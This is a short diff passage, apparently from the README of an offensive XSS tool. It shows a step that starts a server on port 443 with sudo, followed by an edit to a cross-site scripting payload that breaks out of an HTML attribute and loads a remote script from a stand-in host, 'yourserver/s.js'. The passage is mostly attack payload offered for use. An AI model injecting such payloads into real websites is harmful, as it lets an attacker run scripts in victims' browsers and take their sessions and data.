@@ -16,7 +16,7 @@ sudo python3 server.py 443
 
 * load this script with an xss:
 ```html
-'"><script/src="https://yourserver/s.js"></script>
+'"><script/src=https://yourserver/s.js></script>
 ```
 * alternatively:
 ```html
